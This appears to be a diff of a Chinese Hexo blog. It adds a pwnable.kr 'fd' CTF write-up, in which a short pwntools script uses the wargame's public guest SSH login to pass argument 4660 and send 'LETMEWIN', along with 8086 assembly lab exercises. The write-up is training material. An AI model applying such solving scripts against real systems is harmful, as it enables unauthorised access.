+<p>ssize_t read(int filedes, void *buf, size_t nbytes);<br>// 返回：若成功则返回读到的字节数，若已到文件末尾则返回0，若出错则返回-1<br>// filedes：文件描述符[0-标准输入(stdin)，1-标准输出(stdout)，2-标准错误输出(stderr)]<br>// buf:读取数据缓存区<br>// nbytes:要读取的字节数<br>有几种情况可使实际读到的字节数少于要求读的字节数：<br>1）读普通文件时，在读到要求字节数之前就已经达到了文件末端。例如，若在到达文件末端之前还有30个字节，而要求读100个字节，则read返回30，下一次再调用read时，它将返回0（文件末端）。<br>2）当从终端设备读时，通常一次最多读一行。<br>3）当从网络读时，网络中的缓存机构可能造成返回值小于所要求读的字结束。<br>4）当从管道或FIFO读时，如若管道包含的字节少于所需的数量，那么read将只返回实际可用的字节数。<br>5）当从某些面向记录的设备（例如磁带）读时，一次最多返回一个记录。<br>6）当某一个信号造成中断，而已经读取了部分数据。<br>main函数中：</p>
+<h2 id="argc"><a href="#argc" class="headerlink" title="argc"></a>argc</h2><p>argc是命令行参数个数，char <em>argv[]是指所有命令行参数，<br>对于C语言int main(int argc char </em>argv[])来说，argc保存的是命令行总的参数个数(包括程序名)，argv这是传入参数的数组.<br>举个例子，当你执行： ./test 1 2 3 时，argc = 4 而 argv[0] = “test”，argv[1] = 1，argv[2] = 2，argv[3] = 3</p>
+<h2 id="char-envp"><a href="#char-envp" class="headerlink" title="char *envp[]"></a>char *envp[]</h2><p>*envp[]是环境变量（argv[1]位置处存放的是命令行输入的第一个参数） </p>
+<h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><p>atoi函数的作用是把字符转化为int型数据。 命令行读入的参数默认是字符型（如：atio（10）=‘10’）</p>
+<h2 id="ssize-t-read（int-fd，void-buf，size-t-count）"><a href="#ssize-t-read（int-fd，void-buf，size-t-count）" class="headerlink" title="ssize_t read（int fd，void * buf，size_t count）;"></a>ssize_t read（int fd，void * buf，size_t count）;</h2><p>函数说明<br>read（）会参数fd所有的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read ）不会有作用并返回0返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动。</p>
+<p>整数值 名称 &lt; unistd.h &gt; 符号常量[1] &lt; stdio.h &gt; 文件流[2]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0   标准输入    STDIN_FILENO    标准输入</span><br><span class="line">1   标准输出    STDOUT_FILENO   标准输出</span><br><span class="line">2   标准错误    STDERR_FILENO   标准错误</span><br></pre></td></tr></table></figure></p>
+<p>推理：read(0,buf,32)表示从键盘读入至多32个字节到buf中</p>
+<p>那么我们只要控制了FD的值为标准输入，那么buf中的值就可以用我们的键盘输入了，<br>目标是使FD为0，那么我们传进去的第一个参数就是为0x1234，即十进制的4660<br>这里要填十进制因为天0x1234中的0x它会读成字符的，然后把后面的字符变成10进制 </p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>0为标准输入，1为标准输出，2为标准错误，而我们看到read(fd, buf, 32);//关键点,这里fd便是关键，若为0，我们自己输入后，变成功得到flag，所以，我们就要推回去，怎么让fd为0，也就是atoiargv[1]大小为0x1234（atoi是c语言的将字符串转化为数字，假设字符串为str =1234，他会转化为数字int=1234),而0x1234是16进制的，用计算器转换下为4660，也就是说我们要使argv[1]为4660，好，整个思路理清了，接下来便是怎么利用了</p>
+<p><img src="/2019/04/04/pwnable-kr1-fd/j.PNG" alt=""></p>
+<p>//这好像是脚本？蛮放着。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">4</span> pwn_ssh=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'fd'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)<span class="comment">#远程连接</span></span><br><span class="line"> <span class="number">5</span> print(pwn_ssh.connected())<span class="comment">#连接成功判断</span></span><br><span class="line"> <span class="number">6</span> sh=pwn_ssh.process(argv=[<span class="string">'fd'</span>,<span class="string">'4660'</span>],executable=<span class="string">'./fd'</span>)<span class="comment">#加载进程</span></span><br><span class="line"> <span class="number">7</span> sh.sendline(<span class="string">'LETMEWIN'</span>)<span class="comment">#发送一行数据，在末尾加上\n</span></span><br><span class="line"> <span class="number">8</span> print(sh.recvall())<span class="comment">#接受到EOF</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>原文：<a href="https://blog.csdn.net/u010334666/article/details/81192987" target="_blank" rel="noopener">https://blog.csdn.net/u010334666/article/details/81192987</a><br>原文：<a href="https://blog.csdn.net/qq_38204481/article/details/79711702" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/79711702</a> </p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/23/汇编-实验：寻址方式在结构化数据访问中的应用/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/23/汇编-实验：寻址方式在结构化数据访问中的应用/" class="post-title-link" itemprop="url">汇编-实验：寻址方式在结构化数据访问中的应用</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-23 18:49:16 / Modified: 20:12:56" itemprop="dateCreated datePublished" datetime="2019-03-23T18:49:16+08:00">2019-03-23</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/汇编/" itemprop="url" rel="index"><span itemprop="name">汇编</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>大方向</p>
+<p>用bx，si指向data</p>
+<p>用bp，di指向table</p>
+<p>想过一次循环（cx=21）完成 1年的所有数据，发现有难度，data段的数据要不断跳到不同的一堆数据中去。之后改成一次循环（cx=21）只完成一类数据。</p>
+<p>如此就需要4段 代码完成（在一个代码段中）</p>
+<p>每一小段通过21次循环，完成一个21年的一类数据（eg：完成21个年份；完成21年各个年份的收入…）</p>
+<p>~~~asm<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line">datasg segment</span><br><span class="line">    db &apos;1975&apos;,&apos;1976&apos;,&apos;1977&apos;,&apos;1978&apos;,&apos;1979&apos;,&apos;1980&apos;,&apos;1981&apos;,&apos;1982&apos;,&apos;1983&apos;</span><br><span class="line">    db &apos;1984&apos;,&apos;1985&apos;,&apos;1986&apos;,&apos;1987&apos;,&apos;1988&apos;,&apos;1989&apos;,&apos;1990&apos;,&apos;1991&apos;,&apos;1992&apos;</span><br><span class="line">    db &apos;1993&apos;,&apos;1994&apos;,&apos;1995&apos;  ;表示21年的21个字符串</span><br><span class="line"></span><br><span class="line">    dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514</span><br><span class="line">    dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000</span><br><span class="line">    ;总收入的21个数据</span><br><span class="line">    </span><br><span class="line">    dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226</span><br><span class="line">    dw 11542,14430,15257,17800</span><br><span class="line">datasg ends</span><br><span class="line">tablesg segment</span><br><span class="line">    db 21 dup(&apos;year summ ne ?? &apos;)</span><br><span class="line">tablesg ends</span><br><span class="line">;使用bp时，默认段地址是ss，所以ss：bp+di指向table，ds：bx+si指向数据</span><br><span class="line">codesg segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax   ;data段的段地址</span><br><span class="line">    mov ax,tablesg</span><br><span class="line">    mov ss,ax   ;table段的段地址</span><br><span class="line"></span><br><span class="line">    mov bp,0    ;bp,di表示table的地址</span><br><span class="line">    mov bx,0    ;bx,si表示data放的地址</span><br><span class="line">mov si,0 </span><br><span class="line">mov di,0</span><br><span class="line">    mov cx,21</span><br><span class="line">year:   mov ax,[bx+si]</span><br><span class="line">    mov [bp+di],ax </span><br><span class="line">    add si,2</span><br><span class="line">    add di,2</span><br><span class="line">    mov ax,[bx+si]</span><br><span class="line">    mov [bp+di],ax</span><br><span class="line">    add si,2  ;第一年结束    </span><br><span class="line">    add bp,16</span><br><span class="line">    mov di,0</span><br><span class="line">    loop year           ;至此年份结束</span><br><span class="line"></span><br><span class="line">    mov cx,21</span><br><span class="line">    add bx,84</span><br><span class="line">    mov si,0</span><br><span class="line">    mov bp,0</span><br><span class="line">summ:   mov di,5</span><br><span class="line">    mov ax,[bx+si]</span><br><span class="line">    mov [bp+di],ax </span><br><span class="line">    add si,2</span><br><span class="line">    add di,2</span><br><span class="line">    mov ax,[bx+si]</span><br><span class="line">    mov [bp+di],ax</span><br><span class="line">    add si,2      ;第一年结束</span><br><span class="line">    add bp,16</span><br><span class="line">    </span><br><span class="line">    loop summ ;至此收入结束</span><br><span class="line">    </span><br><span class="line">    mov cx,21</span><br><span class="line">    add bx,84</span><br><span class="line">    mov si,0</span><br><span class="line">    mov bp,0</span><br><span class="line">    mov di,10</span><br><span class="line">people: mov ax,[bx+si]</span><br><span class="line">    mov [bp+di],ax </span><br><span class="line">    add si,2      ;第一年结束</span><br><span class="line">    add bp,16</span><br><span class="line">    loop people</span><br><span class="line">    </span><br><span class="line">    mov cx,21</span><br><span class="line">    mov bp,0</span><br><span class="line">    mov di,0</span><br><span class="line">    </span><br><span class="line">income:</span><br><span class="line">    mov ax,[bp+di+5]        ;被除数的低八位    </span><br><span class="line">    add di,2</span><br><span class="line">    mov dx,[bp+di+5]        ;被除数的高八位    </span><br><span class="line">    add di,3    </span><br><span class="line">    div word ptr [bp+di+5]      ;除数</span><br><span class="line">    add di,3</span><br><span class="line">    mov [bp+di+5],ax        ;ax保存的是商，将商输入到table中</span><br><span class="line">                    ;第一年结束</span><br><span class="line">    add bp,16</span><br><span class="line">    mov di,0</span><br><span class="line">    loop income</span><br><span class="line"></span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line"></span><br><span class="line">        db  &apos;1975&apos;,&apos;1976&apos;,&apos;1977&apos;,&apos;1978&apos;,&apos;1979&apos;,&apos;1980&apos;,&apos;1981&apos;,&apos;1982&apos;,&apos;1983&apos;</span><br><span class="line">        db  &apos;1984&apos;,&apos;1985&apos;,&apos;1986&apos;,&apos;1987&apos;,&apos;1988&apos;,&apos;1989&apos;,&apos;1990&apos;,&apos;1991&apos;,&apos;1992&apos;</span><br><span class="line">        db  &apos;1993&apos;,&apos;1994&apos;,&apos;1995&apos;</span><br><span class="line">        ;以上是表示21年的21个字符串 year</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        dd  16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514</span><br><span class="line">        dd  345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000</span><br><span class="line">        ;以上是表示21年公司总收入的21个dword数据   sum</span><br><span class="line"></span><br><span class="line">        dw  3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226</span><br><span class="line">        dw  11542,14430,15257,17800</span><br><span class="line"></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">table segment</span><br><span class="line">            ;0123456789ABCDEF</span><br><span class="line">    db  21 dup (&apos;year summ ne ?? &apos;)</span><br><span class="line">table ends</span><br><span class="line"></span><br><span class="line">stack segment stack</span><br><span class="line">    db  128 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    start:  mov ax,stack</span><br><span class="line">        mov ss,ax</span><br><span class="line">        mov sp,128  ;栈</span><br><span class="line">    </span><br><span class="line">        mov ax,data</span><br><span class="line">        mov ds,ax   ;data段的数据  ds</span><br><span class="line">        </span><br><span class="line">        mov ax,table</span><br><span class="line">        mov es,ax   ;tble段的数据 es</span><br><span class="line">        </span><br><span class="line">        mov si,0    ;</span><br><span class="line">        ;mov di,21*4        ;总收入 此处用si+21*4表示了(因为di表示的总收入也是4字节的所以可以用si代替)</span><br><span class="line">        mov bx,21*4 + 21*4 ;员工数  </span><br><span class="line">        mov bp,0        ;tble段的偏移地址bp</span><br><span class="line"></span><br><span class="line">        mov cx,21</span><br><span class="line">inputtable:</span><br><span class="line">        push ds:[si+0]</span><br><span class="line">        pop es:[bp+0]</span><br><span class="line">        push ds:[si+2]</span><br><span class="line">        pop es:[bp+2]</span><br><span class="line">                    ;年份的输入</span><br><span class="line">        </span><br><span class="line">        mov ax,ds:[si+21*4+0]   ;收入的输入</span><br><span class="line">        mov dx,ds:[si+21*4+2]</span><br><span class="line">        mov es:[bp+5],ax</span><br><span class="line">        mov es:[bp+7],dx</span><br><span class="line"></span><br><span class="line">        push ds:[bx]        ;人员数的输入 </span><br><span class="line">        pop es:[bp+0AH]</span><br><span class="line"></span><br><span class="line">        div word ptr ds:[bx]    ;除法 </span><br><span class="line">        mov es:[bp+0Dh],ax  ;人均输入</span><br><span class="line">        </span><br><span class="line">        add si,4</span><br><span class="line">        add bx,2</span><br><span class="line">        add bp,2</span><br><span class="line">        loop inputtable</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mov ax,4C00H</span><br><span class="line">        int 21H</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/" class="post-title-link" itemprop="url">汇编-实验：将每个的单词的前4个字母改为大写字母（【bx+si+3】）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-20 21:07:00 / Modified: 21:58:38" itemprop="dateCreated datePublished" datetime="2019-03-20T21:07:00+08:00">2019-03-20</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/汇编/" itemprop="url" rel="index"><span itemprop="name">汇编</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><p>将每个的单词的前4个字母改为大写字母（</p>
+<h1 id="key"><a href="#key" class="headerlink" title="key"></a>key</h1><ul>
+<li>两层的循环，用栈来暂存循环次数cx</li>
+<li>利用灵活的定位内存方法：  【bx+si+常数】<br>bx表示行数，由于每个单词占用16个字节，故每次加16；si表示单词中的第几个字母，inc si；常数用来指示每个单词修改的起始地址</li>
+</ul>
+<p>code 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg,ss:stacksg</span><br><span class="line">datasg segment</span><br><span class="line">    db &apos;1. display      &apos;</span><br><span class="line">    db &apos;2. brows        &apos;</span><br><span class="line">    db &apos;3. replace      &apos;</span><br><span class="line">    db &apos;4. modify       &apos;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">stacksg segment</span><br><span class="line">    dw 0,0,0,0,0,0,0,0</span><br><span class="line">stacksg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,stacksg</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    </span><br><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov cx,4</span><br><span class="line">    mov bx,0</span><br><span class="line">s:</span><br><span class="line">    mov si,0</span><br><span class="line">    push cx</span><br><span class="line">    mov cx,3</span><br><span class="line">s0:</span><br><span class="line">    mov al,[bx+si+3]</span><br><span class="line">    and al,11011111b</span><br><span class="line">    mov [bx+si+3],al</span><br><span class="line">    inc si</span><br><span class="line">    loop s0</span><br><span class="line">    </span><br><span class="line">    add bx,16</span><br><span class="line">    pop cx</span><br><span class="line">    loop s</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure></p>
+<p>在设置好ds 之后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/1.PNG" alt=""></p>
+<h1 id="p指令"><a href="#p指令" class="headerlink" title="p指令"></a>p指令</h1><p>我们发现p指令在没遇到loop循环指令时，其实是和t指令没什么不一样的，都是执行一步<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p.PNG" alt=""><br>但是遇到loop时，p指令就会执行完此处循环<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p2.PNG" alt=""><br>此时执行完了一次内层循环，可以看到第一个单词的字母都已经修改完毕<br>这里我们注意下p指令执行的语句<strong>loop 001A</strong><br><br><br>NEXT<br>我们接着运行，此时会遇到一个loop指令（外层的），p指令运行后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/p3.PNG" alt=""><br>我们可以看到这次p指令执行后，所有单词都已经修改完成，可见此次p指令完成的是外层循环<br>我们对比此次p指令执行的语句<strong>loop 0013</strong> 和之前的可以发现，这次的p指令执行的循环跳转是<strong>0013</strong>比之前的<strong>001A</strong>小，说明是比上次跳转到的地方更之前的语句，也证实此次p指令一次执行完了外层的循环，而上一次的p指令一次性执行的是内层</p>
+<p><strong>总之，两个p指令，一个一次性执行完了内层，一个一次性执行了外层（当前肯定是要先执行完内循环）</strong><br>注意点：看p 指令执行的是哪个loop执行  loop的地址是关键</p>
+<p>按g一次性执行完程序后<br><img src="/2019/03/20/汇编-实验：将每个的单词的前4个字母改为大写字母（【bx-si-3】）/3.PNG" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/03/18/Control/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1439,845 +2162,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/22/http基础知识/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/22/http基础知识/" class="post-title-link" itemprop="url">http基础知识</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-22 09:04:08" itemprop="dateCreated datePublished" datetime="2019-02-22T09:04:08+08:00">2019-02-22</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-27 22:27:35" itemprop="dateModified" datetime="2019-02-27T22:27:35+08:00">2019-02-27</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><a href="https://www.cnblogs.com/hggen/p/6264858.html" target="_blank" rel="noopener">HTTP协议简单解析及WEB请求过程</a><br><a href="http://www.blogjava.net/zjusuyong/articles/304788.html" target="_blank" rel="noopener">http协议学习</a><br><a href="https://blog.csdn.net/ynd_sg/article/details/82182951" target="_blank" rel="noopener">http字段总结</a><br><a href="https://www.cnblogs.com/laowenBlog/p/6096241.html" target="_blank" rel="noopener">HTTP 头字段总结</a></p>
-<h1 id="http的状态响应码"><a href="#http的状态响应码" class="headerlink" title="http的状态响应码"></a>http的状态响应码</h1><p><img src="http基础知识/状态码.png" alt=""></p>
-<h2 id="1-：请求收到，继续处理"><a href="#1-：请求收到，继续处理" class="headerlink" title="1**：请求收到，继续处理"></a>1**：请求收到，继续处理</h2><p>100——客户必须继续发出请求</p>
-<p>101——客户要求服务器根据请求转换HTTP协议版本</p>
